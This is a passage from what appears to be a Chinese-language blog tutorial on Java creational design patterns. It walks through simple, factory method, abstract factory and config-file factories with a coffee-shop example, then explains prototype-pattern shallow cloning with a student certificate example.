<li>具体工厂 ：提供了创建产品的方法，调用者通过该方法来获取产品。</li>
</ul>
<p><strong>实现</strong></p>
<p>现在使用简单工厂对上面案例进行改进，类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-40-38.png" style="zoom:70%;" />

<p>工厂类代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleCoffeeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Coffee <span class="title">createCoffee</span><span class="params">(String type)</span> </span>&#123;</span><br><span class="line">        Coffee coffee = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;americano&quot;</span>.equals(type)) &#123;</span><br><span class="line">            coffee = <span class="keyword">new</span> AmericanoCoffee();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;latte&quot;</span>.equals(type)) &#123;</span><br><span class="line">            coffee = <span class="keyword">new</span> LatteCoffee();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> coffee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>工厂（factory）处理创建对象的细节，一旦有了SimpleCoffeeFactory，CoffeeStore类中的orderCoffee()就变成此对象的客户，后期如果需要Coffee对象直接从工厂中获取即可。这样也就解除了和Coffee实现类的耦合，同时又产生了新的耦合，CoffeeStore对象和SimpleCoffeeFactory工厂对象的耦合，工厂对象和商品对象的耦合。</p>
<p>后期如果再加新品种的咖啡，我们势必要需求修改SimpleCoffeeFactory的代码，违反了开闭原则。工厂类的客户端可能有很多，比如创建美团外卖等，这样只需要修改工厂类的代码，省去其他的修改操作。</p>
<p><strong>优缺点</strong></p>
<ul>
<li>优点：<ul>
<li>封装了创建对象的过程，可以通过参数直接获取对象。把对象的创建和业务逻辑层分开，这样以后就避免了修改客户代码，如果要实现新产品直接修改工厂类，而不需要在原代码中修改，这样就降低了客户代码修改的可能性，更加容易扩展。</li>
</ul>
</li>
<li>缺点：<ul>
<li>增加新产品时还是需要修改工厂类的代码，违背了“开闭原则”。</li>
</ul>
</li>
</ul>
<p><strong>扩展</strong></p>
<ul>
<li><strong>静态工厂</strong></li>
</ul>
<p>在开发中也有一部分人将工厂类中的创建对象的功能定义为静态的，这个就是静态工厂模式，它也<strong>不是23种设计模式中</strong>的。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleCoffeeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Coffee <span class="title">createCoffee</span><span class="params">(String type)</span> </span>&#123;</span><br><span class="line">        Coffee coffee = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;americano&quot;</span>.equals(type)) &#123;</span><br><span class="line">            coffee = <span class="keyword">new</span> AmericanoCoffee();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;latte&quot;</span>.equals(type)) &#123;</span><br><span class="line">            coffee = <span class="keyword">new</span> LatteCoffee();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> coffe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="工厂方法模式-1"><a href="#工厂方法模式-1" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h5><p>针对上例中的缺点（有新产品时，还是需要修改工厂类源码，违反开闭原则），使用工厂方法模式就可以完美的解决，完全遵循开闭原则。</p>
<p><strong>概念：</strong></p>
<p>定义一个用于创建对象的接口，让子类决定实例化哪个产品类对象**。工厂方法使一个产品类的实例化延迟到其工厂的子类。</p>
<p><strong>结构</strong></p>
<p>工厂方法模式的主要角色：</p>
<ul>
<li>抽象工厂（Abstract Factory）：提供了创建产品的接口，调用者<strong>通过它访问具体工厂</strong>的工厂方法来创建产品。</li>
<li>具体工厂（ConcreteFactory）：主要是实现抽象工厂中的抽象方法，完成具体产品的创建。</li>
<li>抽象产品（Product）：定义了产品的规范，描述了产品的主要特性和功能。</li>
<li>具体产品（ConcreteProduct）：实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间一一对应。</li>
</ul>
<p><strong>实现</strong></p>
<p>使用工厂方法模式对上例进行改进，类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-40-46.png" style="zoom:70%;" />

<p>代码如下：</p>
<p>抽象工厂：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CoffeeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Coffee <span class="title">createCoffee</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体工厂：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LatteCoffeeFactory</span> <span class="keyword">implements</span> <span class="title">CoffeeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Coffee <span class="title">createCoffee</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LatteCoffee();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AmericanCoffeeFactory</span> <span class="keyword">implements</span> <span class="title">CoffeeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Coffee <span class="title">createCoffee</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AmericanCoffee();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>咖啡店类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CoffeeStore</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> CoffeeFactory factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CoffeeStore</span><span class="params">(CoffeeFactory factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Coffee <span class="title">orderCoffee</span><span class="params">(String type)</span> </span>&#123;</span><br><span class="line">        Coffee coffee = factory.createCoffee();</span><br><span class="line">        coffee.addMilk();</span><br><span class="line">        coffee.addsugar();</span><br><span class="line">        <span class="keyword">return</span> coffee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从以上的编写的代码可以看到，要<strong>增加产品类时也要相应地增加工厂类，不需要修改工厂类的代码</strong>了，这样就解决了简单工厂模式的缺点。</p>
<p><strong>优缺点</strong></p>
<ul>
<li><p>优点：</p>
<ul>
<li>用户只需要知道具体工厂的名称就可得到所要的产品，无须知道产品的具体创建过程；</li>
<li>在系统<strong>增加新的产品时只需要添加具体产品类和对应的具体工厂类，无须对原工厂进行任何修改，满足开闭原则；</strong>**</li>
</ul>
</li>
<li><p>缺点：</p>
<ul>
<li>每增加一个产品就要增加一个具体产品类和一个对应的具体工厂类，这增加了系统的复杂度。</li>
</ul>
</li>
</ul>
<h5 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h5><p>前面介绍的<strong>工厂方法模式中考虑的是一类产品的生产</strong>，如畜牧场只养动物、电视机厂只生产电视机、传智播客只培养计算机软件专业的学生等。</p>
<p>这些工厂只生产同种类产品，同种类产品称为同等级产品，也就是说：<strong>工厂方法模式只考虑生产同等级的产品</strong></p>
<p>但是在现实生活中许多工厂是综合型的工厂，能生产多等级（种类） 的产品，如电器厂既生产电视机又生产洗衣机或空调，大学既有软件专业又有生物专业等。</p>
<p><strong>抽象工厂模式将考虑多等级产品的生产</strong>，将同一个具体工厂所生产的位于不同等级的一组产品称为一个产品族，下图所示横轴是产品等级，也就是同一类产品；纵轴是产品族，也就是同一品牌的产品，同一品牌的产品产自同一个工厂。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-40-56.png" style="zoom:67%;" />

<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-41-00.png" style="zoom:67%;" />

<p><strong>概念</strong></p>
<p>是<strong>一种为访问类提供一个创建一组相关或相互依赖对象的接口</strong>，且访问类无须指定所要产品的具体类就能得到同族的不同等级的产品的模式结构。</p>
<p>工厂方法模式只生产一个等级的产品，而抽象工厂模式可生产多个等级的产品。</p>
<p><strong>结构</strong></p>
<p>抽象工厂模式的主要角色如下：</p>
<ul>
<li>抽象工厂（Abstract Factory）：提供了创建产品的接口，它包含多个创建产品的方法，可以创建多个不同等级的产品。</li>
<li>具体工厂（Concrete Factory）：主要是实现抽象工厂中的多个抽象方法，完成具体产品的创建。</li>
<li>抽象产品（Product）：定义了产品的规范，描述了产品的主要特性和功能，抽象工厂模式有多个抽象产品。</li>
<li>具体产品（ConcreteProduct）：实现了抽象产品角色所定义的接口，由具体工厂来创建，它 同具体工厂之间是多对一的关系。</li>
</ul>
<p><strong>实现</strong></p>
<p>现咖啡店业务发生改变，不仅要生产咖啡还要生产甜点，如提拉米苏、抹茶慕斯等，要是按照工厂方法模式，需要定义提拉米苏类、抹茶慕斯类、提拉米苏工厂、抹茶慕斯工厂、甜点工厂类，很容易发生类爆炸情况。其中拿铁咖啡、美式咖啡是一个产品等级，都是咖啡；提拉米苏、抹茶慕斯也是一个产品等级；拿铁咖啡和提拉米苏是同一产品族（也就是都属于意大利风味），美式咖啡和抹茶慕斯是同一产品族（也就是都属于美式风味）。所以这个案例可以使用抽象工厂模式实现。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-41-08.png" style="zoom:67%;" />

<p>代码如下：</p>
<p>抽象工厂：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DessertFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">Coffee <span class="title">createCoffee</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">Dessert <span class="title">createDessert</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体工厂：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//美式甜点工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AmericanDessertFactory</span> <span class="keyword">implements</span> <span class="title">DessertFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Coffee <span class="title">createCoffee</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> AmericanCoffee();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dessert <span class="title">createDessert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MatchaMousse();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//意大利风味甜点工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ItalyDessertFactory</span> <span class="keyword">implements</span> <span class="title">DessertFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Coffee <span class="title">createCoffee</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LatteCoffee();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Dessert <span class="title">createDessert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Tiramisu();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>如果要加同一个产品族</strong>的话，<strong>只需要再加一个对应的工厂类</strong>即可，不需要修改其他的类。</p>
<p><strong>优缺点</strong></p>
<ul>
<li><p><strong>优点：</strong></p>
<ul>
<li>当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。</li>
</ul>
</li>
<li><p><strong>缺点：</strong></p>
<ul>
<li>当产品族中需要增加一个新的产品时，所有的工厂类都需要进行修改。</li>
</ul>
</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li><p>当需要创建的对象是一系列相互关联或相互依赖的产品族时，如电器工厂中的电视机、洗衣机、空调等。</p>
</li>
<li><p><strong>系统中有多个产品族，但每次只使用其中的某一族产品</strong>。如有人只喜欢穿某一个品牌的衣服和鞋。</p>
</li>
<li><p>系统中提供了产品的类库，且所有产品的接口相同，客户端不依赖产品实例的创建细节和内部结构。</p>
<ul>
<li>如：输入法换皮肤，一整套一起换。生成不同操作系统的程序。</li>
</ul>
</li>
</ul>
<h5 id="模式扩展"><a href="#模式扩展" class="headerlink" title="模式扩展"></a>模式扩展</h5><p><strong>简单工厂+配置文件解除耦合</strong></p>
<p>可以通过工厂模式+配置文件的方式解除工厂对象和产品对象的耦合。在工厂类中加载配置文件中的全类名，并创建对象进行存储，客户端如果需要对象，直接进行获取即可。</p>
<p>第一步：定义配置文件</p>
<p>为了演示方便，我们使用properties文件作为配置文件，名称为bean.properties</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">american</span>=<span class="string">com.itheima.pattern.factory.config_factory.AmericanCoffee</span></span><br><span class="line"><span class="attr">latte</span>=<span class="string">com.itheima.pattern.factory.config_factory.LatteCoffee</span></span><br></pre></td></tr></table></figure>

<p>第二步：改进工厂类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CoffeeFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String,Coffee&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Properties p = <span class="keyword">new</span> Properties();</span><br><span class="line">        InputStream is = CoffeeFactory.class.getClassLoader().getResourceAsStream(<span class="string">&quot;bean.properties&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            p.load(is);</span><br><span class="line">            <span class="comment">//遍历Properties集合对象</span></span><br><span class="line">            Set&lt;Object&gt; keys = p.keySet();</span><br><span class="line">            <span class="keyword">for</span> (Object key : keys) &#123;</span><br><span class="line">                <span class="comment">//根据键获取值（全类名）</span></span><br><span class="line">                String className = p.getProperty((String) key);</span><br><span class="line">                <span class="comment">//获取字节码对象</span></span><br><span class="line">                Class clazz = Class.forName(className);</span><br><span class="line">                <span class="comment">//通过反射创建对象</span></span><br><span class="line">                Coffee obj = (Coffee) clazz.newInstance();</span><br><span class="line">                map.put((String)key,obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Coffee <span class="title">createCoffee</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map.get(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>静态成员变量用来存储创建的对象（键存储的是名称，值存储的是对应的对象），而读取配置文件以及创建对象写在静态代码块中，目的就是只需要执行一次。</p>
<h5 id="JDK源码解析-Collection-iterator方法"><a href="#JDK源码解析-Collection-iterator方法" class="headerlink" title="JDK源码解析-Collection.iterator方法"></a>JDK源码解析-Collection.iterator方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;令狐冲&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;风清扬&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;任我行&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取迭代器对象</span></span><br><span class="line">        Iterator&lt;String&gt; it = list.iterator();</span><br><span class="line">        <span class="comment">//使用迭代器遍历</span></span><br><span class="line">        <span class="keyword">while</span>(it.hasNext()) &#123;</span><br><span class="line">            String ele = it.next();</span><br><span class="line">            System.out.println(ele);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对上面的代码大家应该很熟，使用迭代器遍历集合，获取集合中的元素。而单列集合获取迭代器的方法就使用到了工厂方法模式。我们看通过类图看看结构：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-41-49.png" style="zoom:75%;" />

<p>Collection接口是抽象工厂类，ArrayList是具体的工厂类；Iterator接口是抽象商品类，ArrayList类中的Iter内部类是具体的商品类。在具体的工厂类中iterator()方法创建具体的商品类的对象。</p>
<blockquote>
<p>另：</p>
<p>​    1,DateForamt类中的getInstance()方法使用的是工厂模式；</p>
<p>​    2,Calendar类中的getInstance()方法使用的是工厂模式；</p>
</blockquote>
<h4 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h4><p><strong>概述</strong></p>
<p>用一个已经创建的实例作为原型，通过复制该原型对象来创建一个和原型对象相同的新对象。</p>
<p><strong>结构</strong></p>
<p>原型模式包含如下角色：</p>
<ul>
<li>抽象原型类：规定了具体原型对象必须实现的的 clone() 方法。</li>
<li>具体原型类：实现抽象原型类的 clone() 方法，它是可被复制的对象。</li>
<li>访问类：使用具体原型类中的 clone() 方法来复制新的对象。</li>
</ul>
<p>接口类图如下：</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-00.png"></p>
<p><strong>实现</strong></p>
<p>原型模式的克隆分为<strong>浅克隆</strong>和<strong>深克隆</strong>。</p>
<blockquote>
<p>浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址。</p>
<p>深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。</p>
</blockquote>
<p>Java中的Object类中提供了 <code>clone()</code> 方法来实现浅克隆。 <code>Cloneable </code>接口是上面的类图中的抽象原型类，而实现了<code>Cloneable</code>接口的子实现类就是具体的原型类。代码如下：</p>
<p><strong><code>Realizetype</code>（具体的原型类）：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Realizetype</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Realizetype</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体的原型对象创建完成！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Realizetype <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;具体原型复制成功！&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (Realizetype) <span class="keyword">super</span>.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>PrototypeTest</code>（测试访问类）：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrototypeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Realizetype r1 = <span class="keyword">new</span> Realizetype();</span><br><span class="line">        Realizetype r2 = r1.clone();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;对象r1和r2是同一个对象？&quot;</span> + (r1 == r2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>案例</strong></p>
<p>用原型模式生成“三好学生”奖状</p>
<p>同一学校的“三好学生”奖状除了获奖人姓名不同，其他都相同，可以使用原型模式复制多个“三好学生”奖状出来，然后在修改奖状上的名字即可。</p>
<p>类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-06.png" style="zoom:80%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//奖状类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Citation</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Citation <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Citation) <span class="keyword">super</span>.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试访问类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CitationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Citation c1 = <span class="keyword">new</span> Citation();</span><br><span class="line">        c1.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//复制奖状</span></span><br><span class="line">        Citation c2 = c1.clone();</span><br><span class="line">        <span class="comment">//将奖状的名字修改李四</span></span><br><span class="line">        c2.setName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"></span><br><span class="line">        c1.show();</span><br><span class="line">        c2.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>使用场景</strong></p>
<ul>
<li>对象的创建非常复杂，可以使用原型模式快捷的创建对象。</li>
<li>性能和安全要求比较高。</li>
</ul>
<p><strong>扩展：（深克隆：序列化与反序列化）</strong></p>
<p>将上面的“三好学生”奖状的案例中Citation类的name属性修改为Student类型的属性。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//奖状类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Citation</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Student stu;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Student <span class="title">getStu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> stu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStu</span><span class="params">(Student stu)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stu = stu;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(stu.getName() + <span class="string">&quot;同学：在2020学年第一学期中表现优秀，被评为三好学生。特发此状！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Citation <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Citation) <span class="keyword">super</span>.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//学生类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAddress</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CitationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Citation c1 = <span class="keyword">new</span> Citation();</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student(<span class="string">&quot;张三&quot;</span>, <span class="string">&quot;西安&quot;</span>);</span><br><span class="line">        c1.setStu(stu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//复制奖状</span></span><br><span class="line">        Citation c2 = c1.clone();</span><br><span class="line">        <span class="comment">//获取c2奖状所属学生对象</span></span><br><span class="line">        Student stu1 = c2.getStu();</span><br><span class="line">        stu1.setName(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断stu对象和stu1对象是否是同一个对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;stu和stu1是同一个对象？&quot;</span> + (stu == stu1));</span><br><span class="line"></span><br><span class="line">        c1.show();</span><br><span class="line">        c2.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-42-15.png" style="zoom:80%;" />

<p><font color="red">说明：</font></p>
<p>​    stu对象和stu1对象是同一个对象，就会产生将stu1对象中name属性值改为“李四”，两个Citation（奖状）对象中显示的都是李四。这就是浅克隆的效果，对具体原型类（Citation）中的引用类型的属性进行引用的复制。这种情况需要使用深克隆，而进行深克隆需要使用<strong>对象流</strong>。代码如下：</p>
